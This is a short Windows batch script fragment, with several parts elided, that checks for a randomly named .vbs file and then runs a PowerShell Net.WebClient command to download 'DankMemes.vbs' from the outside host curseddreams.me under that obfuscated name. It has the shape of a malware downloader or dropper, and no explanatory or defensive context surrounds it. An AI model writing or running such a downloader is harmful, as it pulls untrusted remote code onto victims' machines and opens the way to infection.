@echo off
:start
IF EXIST b5754nfhHuf58Gd4568.vbs goto nextfile4
:nextfile4
...
IF NOT EXIST b5754nfhHuf58Gd4568.vbs goto files
:files
...
powershell -Command "(New-Object Net.WebClient).DownloadFile('http://curseddreams.me/scripts/DankMemes.vbs', 'b5754nfhHuf58Gd4568.vbs')"
